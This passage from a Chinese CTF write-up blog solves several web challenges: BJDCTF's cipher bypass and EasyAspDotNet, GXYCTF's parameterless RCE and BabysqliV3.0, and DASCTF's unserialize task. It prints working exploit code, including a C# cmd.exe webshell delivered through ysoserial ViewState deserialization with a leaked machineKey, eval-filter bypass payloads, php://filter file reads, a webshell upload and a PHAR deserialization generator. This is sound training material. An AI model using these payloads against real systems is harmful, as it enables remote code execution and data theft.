&amp;&amp; $_COOKIE[&#39;y1ng&#39;] &#x3D;&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))</span><br><span class="line">        return true;</span><br><span class="line">    else</span><br><span class="line">        return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D;&#x3D; &quot;127.0.0.1&quot; ) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;black&gt;&lt;center&gt;&lt;font size&#x3D;&#39;10px&#39; color&#x3D;white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[&#39;user&#39;] &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;decrypt&#39;])) &#123;</span><br><span class="line">    $decr &#x3D; $_GET[&#39;decrypt&#39;];</span><br><span class="line">    if (Check())&#123;</span><br><span class="line">        $data &#x3D; $_SESSION[&#39;secret&#39;];</span><br><span class="line">        include &#39;flag_2sln2ndln2klnlksnf.php&#39;;</span><br><span class="line">        $cipher &#x3D; aesEn($data, &#39;y1ng&#39;);</span><br><span class="line">        if ($decr &#x3D;&#x3D;&#x3D; $cipher)&#123;</span><br><span class="line">            echo WHAT_YOU_WANT;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&#39;爬&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    &#x2F;&#x2F;I heard you can break PHP mt_rand seed</span><br><span class="line">    mt_srand(rand(0,9999999));</span><br><span class="line">    $length &#x3D; mt_rand(40,80);</span><br><span class="line">    $_SESSION[&#39;secret&#39;] &#x3D; bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">%d</span><br></pre></td></tr></table></figure>

<p>可以发现%d被当成字符窜输出了<br>先看到主函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#39;decrypt&#39;])) &#123;</span><br><span class="line">    $decr &#x3D; $_GET[&#39;decrypt&#39;];</span><br><span class="line">    if (Check())&#123;       &#x2F;&#x2F;调用check函数</span><br><span class="line">        $data &#x3D; $_SESSION[&#39;secret&#39;];</span><br><span class="line">        include &#39;flag_2sln2ndln2klnlksnf.php&#39;;</span><br><span class="line">        $cipher &#x3D; aesEn($data, &#39;y1ng&#39;);</span><br><span class="line">        if ($decr &#x3D;&#x3D;&#x3D; $cipher)&#123;</span><br><span class="line">            echo WHAT_YOU_WANT;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&#39;爬&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    &#x2F;&#x2F;I heard you can break PHP mt_rand seed</span><br><span class="line">    mt_srand(rand(0,9999999));</span><br><span class="line">    $length &#x3D; mt_rand(40,80);</span><br><span class="line">    $_SESSION[&#39;secret&#39;] &#x3D; bin2hex(random_bytes($length)); &#x2F;&#x2F;生成随机字符窜</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到加密函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function aesEn($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method &#x3D; &#39;AES-128-CBC&#39;;</span><br><span class="line">    $iv &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;],true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>告诉我们加密方式了<br>其他参数都知道，由于session值可以更改，所以我们让session值为空，就能够自己算出密文绕过他的审查<br>再看到admin.php的页面<br><img src="https://img-blog.csdnimg.cn/20200327115747571.png" alt="在这里插入图片描述"><br>必须要这个ip<br>由此构造密文脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function aesEn($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method &#x3D; &#39;AES-128-CBC&#39;;</span><br><span class="line">    $iv &#x3D; md5(&#39;174.0.222.75&#39;, true); &#x2F;&#x2F; your global ip address here</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cipher &#x3D; aesEn(&#39;NULL&#39;, &#39;y1ng&#39;);</span><br><span class="line">echo urlencode($cipher);</span><br><span class="line">&#x2F;&#x2F;一定要url编码，不然不成功</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>将PHPSESSID删去(也就是置空)再将decrypt=“脚本输出的密文”传入即可</p>
<hr>
<h1 id="BJDCTF-2nd-EasyAspDotNet"><a href="#BJDCTF-2nd-EasyAspDotNet" class="headerlink" title="[BJDCTF 2nd]EasyAspDotNet"></a>[BJDCTF 2nd]EasyAspDotNet</h1><p>一道windows题，赵老板还是厉害。</p>
<p><a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/" target="_blank" rel="noopener">赵老板发的文章</a><br><a href="https://www.zhaoj.in/read-6497.html" target="_blank" rel="noopener">赵老板题解</a><br>赵老板文章里的一句话：<br><strong>打 CTF 的同学也请把眼光放远一些，不要给自己创造舒适区，多接触一些新的东西。</strong></p>
<p>微软的漏洞，产生的原因是每台 Exchange Server 安装完后在某个 Component 中都使用了同一把固定的 Machine Key，可以通过这个KEY篡改 ASP.NET Form 中的 VIEWSTATE 参数数值以进行反序列化攻击，从而达成 Remote Code Execution 控制整台主机服服器。</p>
<p>aspx后缀的页面，通常都有一个配置文件web.config.这题存在任意文件泄露<br>click后查看源代码，会发现图片的位置所在，复制到url中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;cdef4387-9ab9-4b9b-a606-6e179e2b62ed.node3.buuoj.cn&#x2F;ImgLoad.aspx?path&#x3D;4.gif</span><br></pre></td></tr></table></figure>
<p>注意他的url</p>
<p><img src="https://img-blog.csdnimg.cn/20200327204453360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现可以文件包含读取，这样就可以读取web.config文件了，我看了师傅们都是用curl来进行文件读取的，但是我自己试了不行，可以用迅雷下载<br>下载出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">&lt;system.web&gt;</span><br><span class="line">&lt;machineKey validationKey&#x3D;&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot; decryptionKey&#x3D;&quot;B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5&quot; validation&#x3D;&quot;SHA1&quot; decryption&#x3D;&quot;3DES&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;system.web&gt;</span><br><span class="line">&lt;&#x2F;configuration&gt;</span><br></pre></td></tr></table></figure>
<p>接下来要用到工具ysoserial，赵老板的题解已提供下载链接<br>根据那篇文章，得出这个工具的使用方法<br><img src="https://img-blog.csdnimg.cn/20200327230333679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>看到参数，可以发现缺少ExploitClass.cs</p>
<p>短文已给出相关payload：<br>复制到ExploitClass.cs文件就好</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class E</span><br><span class="line">&#123;</span><br><span class="line">    public E()</span><br><span class="line">    &#123;</span><br><span class="line">        System.Web.HttpContext context &#x3D; System.Web.HttpContext.Current;</span><br><span class="line">        context.Server.ClearError();</span><br><span class="line">        context.Response.Clear();</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.Process process &#x3D; new System.Diagnostics.Process();</span><br><span class="line">            process.StartInfo.FileName &#x3D; &quot;cmd.exe&quot;;</span><br><span class="line">            string cmd &#x3D; context.Request.Form[&quot;cmd&quot;];</span><br><span class="line">            process.StartInfo.Arguments &#x3D; &quot;&#x2F;c &quot; + cmd;</span><br><span class="line">            process.StartInfo.RedirectStandardOutput &#x3D; true;</span><br><span class="line">            process.StartInfo.RedirectStandardError &#x3D; true;</span><br><span class="line">            process.StartInfo.UseShellExecute &#x3D; false;</span><br><span class="line">            process.Start();</span><br><span class="line">            string output &#x3D; process.StandardOutput.ReadToEnd();</span><br><span class="line">            context.Response.Write(output);</span><br><span class="line">        &#125; catch (System.Exception) &#123;&#125;</span><br><span class="line">        context.Response.Flush();</span><br><span class="line">        context.Response.End();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后需要引入的 dll 可以在安裝了 .NET Framework 的 Windows 主机上找到，文章中已给出相关路径</p>
<p>最后的payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c &quot;ExploitClass.cs;.&#x2F;System.dll;.&#x2F;System.Web.dll&quot; --generator&#x3D;&quot;CA0B0334&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot;</span><br></pre></td></tr></table></figure>

<p>得出的密文传入<br>__VIEWSTATE</p>
<p>用postman进行传参就好<br>cmd指令:（与linux指令不一样）<br>dir 列出当前目录</p>
<p>type 查看当前文件<br><img src="https://img-blog.csdnimg.cn/202003272314208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019--WEB</title>
    <url>/2020/04/05/GXYCTF2020-WEB/</url>
    <content><![CDATA[<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><h2 id="git泄露用GITHACK获得源码"><a href="#git泄露用GITHACK获得源码" class="headerlink" title=".git泄露用GITHACK获得源码"></a>.git泄露用GITHACK获得源码</h2><h3 id="无参数命令执行"><a href="#无参数命令执行" class="headerlink" title="无参数命令执行"></a>无参数命令执行</h3><p>利用超全局变量进行绕过各种正则匹配<br>可以进行无参数命令执行</p>
<hr>
<a id="more"></a>


<p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E6%B3%95%E4%BA%94%EF%BC%9A" target="_blank" rel="noopener">参考文献</a></p>
<p>相关函数</p>
<pre><code>•localeconv() 函数返回一包含本地数字及货币格式信息的数组

•scandir() 列出目录中的文件和目录。

• readfile() 输出一个文件。

• current() 返回数组中当前元素的值

• pos() current() 的别名。

• next() 函数将内部指针指向数组中的下一个元素，并输出。

• array_reverse()以相反的元素顺序返回数组。

• highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码

•getcwd()         获取当前目录

•show_source()   高亮显示

• dirname()  返回上一级目录

• chdir(目录)   更改当前目录

•array_rand()     取数组随机位置</code></pre><p><strong>相关源码</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (!preg_match(&#39;&#x2F;data:\&#x2F;\&#x2F;|filter:\&#x2F;\&#x2F;|php:\&#x2F;\&#x2F;|phar:\&#x2F;\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">     if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">         if (!preg_match(&#39;&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">             &#x2F;&#x2F; echo $_GET[&#39;exp&#39;];</span><br><span class="line">             @eval($_GET[&#39;exp&#39;]);</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>第一个if禁止了文件包含所要用的的关键词 </p>
<p>第二个if  将 （字母与下划线组成的字符窜 ( ) ）替换为空<br>举个例子，意思是将scandir()变成null，这就意味着在执行函数的时候不能放参数 </p>
<p>第三个if   禁止了相关命令执行函数的词</p>
</blockquote>
<p>但还是能找到一些函数进行命令执行<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp&#x3D;print_r(scandir(urrent(localeconv())));</span><br><span class="line"></span><br><span class="line">exp&#x3D;print_r(array_reverse(scandir(current(localeconv()))));</span><br><span class="line"></span><br><span class="line">exp&#x3D;print_r(next(array_reverse(scandir(current(localeconv())))));</span><br><span class="line"></span><br><span class="line">exp&#x3D;show_source(next(array_reverse(scandir(current(localeconv())))));</span><br><span class="line"></span><br><span class="line">exp&#x3D;show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>##方法二:<br>设置session值</p>
<p>PHPSESSID=flag.php</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print_r(session_id(session_start()));</span><br><span class="line"></span><br><span class="line">readfile(session_id(session_start()));</span><br></pre></td></tr></table></figure>


<h1 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h1><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p><strong>第一个界面是弱密码<br>admin password登录即可</strong><br>登陆之后是一段文件上传<br>上传一句话木马<br><img src="https://img-blog.csdnimg.cn/20200404104611359.png" alt="在这里插入图片描述"><br>可以发现后缀被改为txt了<br>然后看看他的url有什么不一样<br><img src="https://img-blog.csdnimg.cn/20200404104611359.png" alt="在这里插入图片描述"><br>明显的文件包含<br>读取upload的源码<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload</span><br></pre></td></tr></table></figure>

<p>源码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">	上传文件</span><br><span class="line">	&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Uploader&#123;</span><br><span class="line">	public $Filename;</span><br><span class="line">	public $cmd;</span><br><span class="line">	public $token;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$sandbox &#x3D; getcwd().&quot;&#x2F;uploads&#x2F;&quot;.md5($_SESSION[&#39;user&#39;]).&quot;&#x2F;&quot;;</span><br><span class="line">		$ext &#x3D; &quot;.txt&quot;;</span><br><span class="line">		@mkdir($sandbox, 0777, true);</span><br><span class="line">		if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;&#x2F;data:\&#x2F;\&#x2F; | filter:\&#x2F;\&#x2F; | php:\&#x2F;\&#x2F; | \.&#x2F;i&quot;, $_GET[&#39;name&#39;]))&#123;</span><br><span class="line">			$this-&gt;Filename &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			$this-&gt;Filename &#x3D; $sandbox.$_SESSION[&#39;user&#39;].$ext;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$this-&gt;cmd &#x3D; &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;</span><br><span class="line">		$this-&gt;token &#x3D; $_SESSION[&#39;user&#39;];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function upload($file)&#123;</span><br><span class="line">		global $sandbox;</span><br><span class="line">		global $ext;</span><br><span class="line"></span><br><span class="line">		if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;</span><br><span class="line">			$this-&gt;cmd &#x3D; &quot;die(&#39;illegal filename!&#39;);&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			if($file[&#39;size&#39;] &gt; 1024)&#123;</span><br><span class="line">				$this-&gt;cmd &#x3D; &quot;die(&#39;you are too big (′▽&#96;〃)&#39;);&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				$this-&gt;cmd &#x3D; &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __toString()&#123;</span><br><span class="line">		global $sandbox;</span><br><span class="line">		global $ext;</span><br><span class="line">		&#x2F;&#x2F; return $sandbox.$this-&gt;Filename.$ext;</span><br><span class="line">		return $this-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;</span><br><span class="line">			$this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		eval($this-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[&#39;file&#39;])) &#123;</span><br><span class="line">	$uploader &#x3D; new Uploader();</span><br><span class="line">	$uploader-&gt;upload($_FILES[&quot;file&quot;]);</span><br><span class="line">	if(@file_get_contents($uploader))&#123;</span><br><span class="line">		echo &quot;下面是你上传的文件：&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo file_get_contents($uploader);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>看到__construct()方法<br><img src="https://img-blog.csdnimg.cn/20200404104853713.png" alt="在这里插入图片描述"><br>可以发现出题人在写正则匹配的时候，为了好看，打了好多空格原本他想匹配<br><strong>“    .       “</strong><br>却因为前面敲了空格，那么他只能匹配到<br>“ 空格 .”<br>又因为$this-&gt;filename我们可以修改,因为是由GET请求name决定嘛<br>由此我们先让name为我们要上传的一句话木马<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;upload.php?name&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;penson.php</span><br></pre></td></tr></table></figure>
<p>然后$this-&gt;filename就变为penson.php了<br>又由于他限制了文件大小小于1024kb，保险起见上传.txt的一句话木马<br>蚁剑连接即可</p>
<p>更简单的非预期解<br><img src="https://img-blog.csdnimg.cn/20200404112006207.png" alt="在这里插入图片描述"><br>因为 file_get_contents函数高亮显示变量的内容，而$this-&gt;filename又变得可控<br>那个匹配有没用了<br>直接让name=flag.php<br>随便上传一个文件即可</p>
<p>##预期解<br>PHAR反序列化</p>
<p><a href="https://paper.seebug.org/680/#21-phar" target="_blank" rel="noopener">phar反序列化参考文章</a></p>
<p>phar://伪协议可以不依赖unserialize()直接进行反序列化操作，加之$this-&gt;Filename可控，因此此处$this-&gt;Filename配合phar反序列化后可以执行我们想要的命令<br> 由于 __destruct()方法给了eval()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function __destruct()&#123;</span><br><span class="line">	if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;</span><br><span class="line">		$this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	eval($this-&gt;cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么我们可以生成一个phar文件<br>代码如下<br><strong>注意：需要将php.ini中的phar.readonly设置成off。</strong><br>再生成phar文件之前，需要确定上传的文件的token<br><img src="https://img-blog.csdnimg.cn/20200405171746928.png" alt="在这里插入图片描述"><br>我们根据源代码，随便上传一个文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Uploader&#123;</span><br><span class="line">	public $Filename;</span><br><span class="line">	public $cmd;</span><br><span class="line">	public $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o &#x3D; new Uploader();</span><br><span class="line">$o-&gt;cmd &#x3D; &#39;highlight_file(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;);&#39;; </span><br><span class="line">$o-&gt;Filename &#x3D; &#39;test&#39;;</span><br><span class="line">$o-&gt;token &#x3D; &#39;GXY9c0cfa04a94d475cd641716d4c699891&#39;; &#x2F;&#x2F;$_SESSION[&#39;user&#39;]，确定token值</span><br><span class="line">echo serialize($o);</span><br><span class="line"></span><br><span class="line">$phar &#x3D; new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub，增加gif文件头</span><br><span class="line">$phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>将生成的文件上传后<br>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;upload&amp;name&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;805453d014fddbf62528d84efd251ac6&#x2F;GXY9c0cfa04a94d475cd641716d4c699891.txt</span><br></pre></td></tr></table></figure>
<p>再随便上传文件即可高亮输出flag.php</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF——四月春季赛---Web</title>
    <url>/2020/05/02/DASCTF%E2%80%94%E2%80%94%E5%9B%9B%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9B-Web/</url>
    <content><![CDATA[<h2 id="Ezunserialize"><a href="#Ezunserialize" class="headerlink" title="Ezunserialize"></a><strong>Ezunserialize</strong></h2><p>比赛的时候去玩了，刚好兄弟们发了第一个web的源码，于是我自己复现了一下</p>
<a id="more"></a>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">"index.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>) , $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $username;</span><br><span class="line">	<span class="keyword">public</span> $password;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a,$b)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $b =<span class="string">'gqy'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$c = <span class="string">'a'</span>.<span class="keyword">$this</span>-&gt;b;</span><br><span class="line">		<span class="keyword">echo</span> $c;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $c;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="comment">//flag.php</span></span><br><span class="line">		<span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'nice'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($_GET[<span class="string">'a'</span>],$_GET[<span class="string">'b'</span>]);</span><br><span class="line"></span><br><span class="line">$b = unserialize(read(write(serialize($a))));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看源码明显的反序列化漏洞，接着我们构造pop链<br><img src="https://img-blog.csdnimg.cn/20200429213728511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这两个类，<strong>destruct和</strong>toString魔术方法怎么自动调用就不详说了，之前的文章已经详细说明了。</p>
<p>pop链构造思路如下<br><strong>题目已提示flag.php，所以我们要让C类的属性c=flag.php，从而通过file_get_content()输出flag，但是要输出flag，得先自动调用_toString魔术方法,所以我们让B类的属性b等于C类，从而输出一个类，就自动调用_toString魔术方法了</strong><br>exp如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $c = <span class="string">"flag.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> B();</span><br><span class="line">$a-&gt;b = <span class="keyword">new</span> C();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>序列化的内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>如果我们直接将上面这段内容传进去的话<br><img src="https://img-blog.csdnimg.cn/20200429220142349.png" alt="在这里插入图片描述"><br>可以发现对象被当成password的一个值了(也就是字符窜)，所以不能够调用魔术方法</p>
